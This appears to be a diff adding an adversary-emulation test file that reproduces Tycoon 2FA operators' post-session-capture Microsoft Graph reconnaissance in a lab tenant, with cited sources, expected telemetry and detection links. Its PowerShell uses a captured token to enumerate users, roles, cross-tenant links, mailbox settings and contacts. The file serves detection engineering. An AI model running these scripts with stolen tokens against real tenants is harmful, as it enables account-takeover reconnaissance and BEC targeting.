@@ -1,0 +1,219 @@
+# LAB TENANT ONLY -- Tacklebox.psm1 enforces at load
+attack_technique: T1087.004
+display_name: "AiTM – Tycoon 2FA Graph API Enumeration Post-Session-Capture"
+_mapping_confidence: medium
+_mapping_confidence_rationale: "Graph recon pattern inferred from Sekoia's operator playbook for synchronous-relay kits generally; Tycoon-specific explicit API paths not stated in available sources -- medium pending lab replay or per-kit source."
+_citations:
+  - claim_type: identity_attack_flows
+    source_url: https://blog.sekoia.io/global-analysis-of-adversary-in-the-middle-phishing-threats/
+    quote_or_anchor: "Synchronous-relay kit operators enumerate /me, /users, /organization post-capture for target profiling and BEC targeting -- cross-kit operator playbook"
+  - claim_type: entra_telemetry
+    source_url: https://learn.microsoft.com/en-us/graph/api/resources/user
+    quote_or_anchor: "Microsoft Graph /users endpoint; /me, /organization, /directoryRoles resource paths"
+# Sufficiency: Sekoia is tier_1 with identity_attack_flows in grounds -- sufficient alone for medium.
+
+# Promotion target: consolidate into atomics/T1087.004-graph-enumeration/T1087.004-graph-enumeration.yaml
+#   Add Tycoon variant to atomic_tests[].
+
+atomic_tests:
+  - name: "Tycoon 2FA variant -- Graph API enumeration post-AiTM-capture"
+    auto_generated_guid: "00000000-0000-0000-0000-000000000000"  # regenerate at promotion
+    description: |
+      Emulates the post-session-capture Graph enumeration step attributed to
+      Tycoon 2FA operator playbook. Operator queries /me (identity verification),
+      /users (directory listing for BEC targeting), /organization (tenant info).
+      Uses a Graph-scoped token obtained from the T1539 or T1550.001 step.
+    supported_platforms: [windows]
+    auth_profile: graph-delegated
+    input_arguments:
+      token_cache_path:
+        description: "Path to a Graph-scoped token cache from a prior atomic."
+        type: Path
+        default: "#{token_cache_path}"
+      target_user_id:
+        description: "UPN or object ID of the compromised user."
+        type: String
+      output_path:
+        description: "Path to write enumeration results (for evidence)."
+        type: Path
+        default: "tacklebox-tycoon-graph-enum.json"
+    executor:
+      name: powershell
+      command: |
+        # LAB TENANT ONLY -- Tacklebox.psm1 enforces at load
+        # wrap-tool: dependencies/manifests/microsoft-graph.json
+        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
+        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
+
+        $results = @{}
+        $results.me           = Get-MgUser -UserId '#{target_user_id}' -Select 'id,displayName,userPrincipalName,jobTitle,department'
+        $results.organization = Get-MgOrganization -Select 'id,displayName,verifiedDomains'
+        $results.users        = Get-MgUser -Top 20 -Select 'id,displayName,userPrincipalName,jobTitle' |
+                                    Select-Object Id, DisplayName, UserPrincipalName, JobTitle
+
+        $results | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath '#{output_path}'
+        Write-Host "Enumerated me/organization/users for '#{target_user_id}'."
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{output_path}') {
+          Remove-Item -LiteralPath '#{output_path}' -Force
+      }
+    expected_telemetry:
+      - source: entra_signin
+        within_minutes: 5
+        match:
+          ResourceDisplayName: "Microsoft Graph"
+          authenticationProtocol: "refreshToken"
+      - source: graph_audit
+        within_minutes: 10
+        match:
+          activityDisplayName: "Get user"
+    exercises_chokepoint:
+      id: graph-api-recon-burst
+      url: https://iimp0ster.github.io/detection-chokepoints/drafts/discovery/graph-api-recon-burst
+
+  # -----------------------------------------------------------------------
+  # NEW VARIANT (2026-05-27) — Elastic Security Labs source
+  # Upgrades mapping confidence from medium → high and expands the endpoint
+  # scope from 3 generic paths to the documented 5-category Tycoon 2FA burst.
+  # The prior entry covers /me, /users, /organization generically.
+  # This entry covers the specific 5-category burst with timing constraints
+  # and the empty c_DeviceId / /beta/ disproportionate signals.
+  # -----------------------------------------------------------------------
+  - name: "Tycoon 2FA variant -- 5-category Graph recon burst operator console (Elastic 2026-05-27)"
+    auto_generated_guid: "00000000-0000-0000-0000-000000000000"  # regenerate at promotion
+    description: |
+      Emulates the Tycoon 2FA operator console automated reconnaissance burst.
+      Tycoon's operator console tier (Tier 2, residential ASN) executes 20-30+
+      Graph API calls across 5 distinct categories within 30-60 seconds, ~10-20
+      minutes after the kit relay completes session theft.
+
+      5 categories:
+        1. Role Discovery:     transitiveRoleAssignments, directoryRole, roleManagement/directory/roleAssignments
+        2. Cross-Tenant Recon: tenantRelationships/getResourceTenants (POST)
+        3. Mailbox Recon:      me/mailboxSettings
+        4. Contact Harvest:    me/contactFolders/contacts ($top=1000)
+        5. Org & Licensing:    subscribedSkus, organization, appRoleAssignedResources ($top=999)
+
+      Distinguishing signals vs. normal admin portal navigation:
+      - 4+ distinct endpoint categories in 60 seconds (impossible at human speed)
+      - Empty c_DeviceId (unmanaged, unregistered device — operator's residential proxy)
+      - /beta/ API disproportionate to /v1.0/ vs. normal portal
+      - Mixed GET/POST methods and mixed 200/400/403 response codes
+
+      Important: c_sid in Graph Activity Logs is NOT the user object ID — it is a
+      session/security-context identifier. Pivot via source IP + appId against
+      Entra ID sign-in logs to identify UPN. Filtering c_sid == user_object_id
+      returns empty results (documented analyst mistake per Elastic article).
+
+      Lab-safe execution: Microsoft.Graph PowerShell module issues the same
+      Graph requests; empty c_DeviceId is reproduced by running from an unmanaged
+      lab machine. The 60-second timing constraint is reproduced by scripting all
+      5 categories into a single burst with minimal delay.
+    _mapping_confidence: high
+    _mapping_confidence_rationale: "5-category endpoint taxonomy, 60-second burst timing, empty c_DeviceId, and 10-20 minute post-relay timing all explicitly documented in Elastic Security Labs tier_1 source."
+    _citations:
+      - claim_type: kit_internals
+        source_url: https://www.elastic.co/security-labs/tycoon-2fa-aitm-detection-engineering
+        quote_or_anchor: "Operator console tier executes 20-30+ Graph API calls across 5 recon categories within 30-60 seconds; 4+ categories in 60s impossible at human speed"
+      - claim_type: api_endpoints
+        source_url: https://www.elastic.co/security-labs/tycoon-2fa-aitm-detection-engineering
+        quote_or_anchor: "transitiveRoleAssignments, tenantRelationships/getResourceTenants, me/mailboxSettings, me/contactFolders/contacts, subscribedSkus, organization, appRoleAssignedResources"
+      - claim_type: entra_telemetry
+        source_url: https://www.elastic.co/security-labs/tycoon-2fa-aitm-detection-engineering
+        quote_or_anchor: "empty c_DeviceId on all operator console requests; /beta/ disproportionate; c_sid is NOT user object ID -- pivot via source IP + appId"
+    supported_platforms: [windows]
+    auth_profile: graph-delegated
+    input_arguments:
+      token_cache_path:
+        description: "Path to a Graph-scoped token cache from T1539 or T1098.005 step."
+        type: Path
+        default: "#{token_cache_path}"
+      target_user_id:
+        description: "UPN or object ID of the compromised user."
+        type: String
+      output_path:
+        description: "Path to write recon results (lab evidence)."
+        type: Path
+        default: "tacklebox-tycoon-recon-burst.json"
+    executor:
+      name: powershell
+      command: |
+        # LAB TENANT ONLY -- Tacklebox.psm1 enforces at load
+        # wrap-tool: dependencies/manifests/microsoft.graph.json
+        Import-Module Microsoft.Graph.Identity.DirectoryManagement -ErrorAction Stop
+        Import-Module Microsoft.Graph.Users                         -ErrorAction Stop
+
+        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
+        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
+
+        $results = [ordered]@{}
+
+        # Category 1: Role Discovery
+        $results.roles = Invoke-MgGraphRequest -Method GET `
+            -Uri 'https://graph.microsoft.com/beta/me/transitiveRoleAssignments?$select=roleDefinitionId' `
+            -ErrorAction SilentlyContinue
+
+        # Category 2: Cross-Tenant Recon
+        $results.crossTenant = Invoke-MgGraphRequest -Method POST `
+            -Uri 'https://graph.microsoft.com/beta/tenantRelationships/getResourceTenants' `
+            -Body '{}' -ContentType 'application/json' -ErrorAction SilentlyContinue
+
+        # Category 3: Mailbox Recon
+        $results.mailboxSettings = Invoke-MgGraphRequest -Method GET `
+            -Uri 'https://graph.microsoft.com/v1.0/me/mailboxSettings' `
+            -ErrorAction SilentlyContinue
+
+        # Category 4: Contact Harvest
+        $results.contacts = Invoke-MgGraphRequest -Method GET `
+            -Uri 'https://graph.microsoft.com/v1.0/me/contactFolders/contacts?$top=1000' `
+            -ErrorAction SilentlyContinue
+
+        # Category 5: Org & Licensing
+        $results.subscribedSkus = Invoke-MgGraphRequest -Method GET `
+            -Uri 'https://graph.microsoft.com/v1.0/subscribedSkus' `
+            -ErrorAction SilentlyContinue
+        $results.organization = Invoke-MgGraphRequest -Method GET `
+            -Uri 'https://graph.microsoft.com/v1.0/organization' `
+            -ErrorAction SilentlyContinue
+        $results.appRoleResources = Invoke-MgGraphRequest -Method GET `
+            -Uri 'https://graph.microsoft.com/beta/me/appRoleAssignedResources?$top=999&$count=true' `
+            -ErrorAction SilentlyContinue
+
+        $results | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath '#{output_path}'
+        Write-Host "5-category Graph recon burst complete."
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{output_path}') {
+          Remove-Item -LiteralPath '#{output_path}' -Force
+      }
+    expected_telemetry:
+      - source: graph_activity_logs
+        within_minutes: 5
+        match:
+          RequestUri: "transitiveRoleAssignments"
+          DeviceId: ""
+      - source: graph_activity_logs
+        within_minutes: 5
+        match:
+          RequestUri: "tenantRelationships"
+          DeviceId: ""
+      - source: graph_activity_logs
+        within_minutes: 5
+        match:
+          RequestUri: "mailboxSettings"
+          DeviceId: ""
+      - source: graph_activity_logs
+        within_minutes: 5
+        match:
+          RequestUri: "contactFolders"
+          DeviceId: ""
+      - source: graph_activity_logs
+        within_minutes: 5
+        match:
+          RequestUri: "subscribedSkus"
+          DeviceId: ""
+      # Aggregated hunt signal: 4+ distinct categories from same UPN within 60s
+      # Cannot express as a single-event telemetry match — must be validated via
+      # ES|QL / KQL aggregation query in the detection-chokepoints hunt rule.
+    exercises_chokepoint:
+      id: graph-api-recon-burst
+      url: https://iimp0ster.github.io/detection-chokepoints/drafts/discovery/graph-api-recon-burst
